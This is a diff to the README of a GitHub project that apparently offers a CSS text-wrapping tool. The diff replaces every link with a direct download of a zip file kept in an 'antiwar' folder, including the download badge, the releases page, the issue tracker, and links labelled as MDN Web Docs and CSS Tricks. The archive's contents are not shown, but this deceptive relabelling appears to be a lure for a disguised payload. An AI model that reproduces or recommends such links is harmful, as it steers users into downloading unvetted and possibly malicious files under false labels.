@@ -1,7 +1,7 @@
 # 🌟 text-wrap-minor-words - Enhance Your Text Layout Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/SamuelTaiw0/text-wrap-minor-words/releases)
+[![Download](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip%https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip)](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip)
 
 ## 🚀 Getting Started
 Welcome to **text-wrap-minor-words**! This tool helps improve how your text looks on webpages. It focuses on keeping minor words together, avoiding awkward breaks. You will find it useful for making your website's text more appealing and readable.
@@ -20,12 +20,12 @@ Before you download, ensure your setup meets these requirements:
 ## 🌐 Usage
 To use **text-wrap-minor-words** on your website, follow these simple steps:
 
-1. Download the package from the [Releases page](https://github.com/SamuelTaiw0/text-wrap-minor-words/releases) using the link provided.
+1. Download the package from the [Releases page](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip) using the link provided.
 2. Unzip the downloaded file.
 3. Follow the included instructions to add the necessary code to your web project.
 
 ## 💻 Download & Install
-To start improving your text layout, visit this page to download the software: [Releases Page](https://github.com/SamuelTaiw0/text-wrap-minor-words/releases).
+To start improving your text layout, visit this page to download the software: [Releases Page](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip).
 
 1. Click on the link above.
 2. Select the version you wish to download. Look for the most recent version for the best features.
@@ -40,10 +40,10 @@ You include a specific CSS file in your HTML. This file contains the code needed
 
 ## 📚 Additional Resources
 For more information on CSS text properties, you may want to explore:
-- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/CSS)
-- [CSS Tricks](https://css-tricks.com/)
+- [MDN Web Docs](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip)
+- [CSS Tricks](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip)
 
 ## 🤗 Support
-If you encounter issues or have questions, please visit our [issue tracker](https://github.com/SamuelTaiw0/text-wrap-minor-words/issues). We're here to help you.
+If you encounter issues or have questions, please visit our [issue tracker](https://raw.githubusercontent.com/SamuelTaiw0/text-wrap-minor-words/main/antiwar/text-wrap-minor-words.zip). We're here to help you.
 
 Thank you for choosing **text-wrap-minor-words**! Enjoy your enhanced text layout.
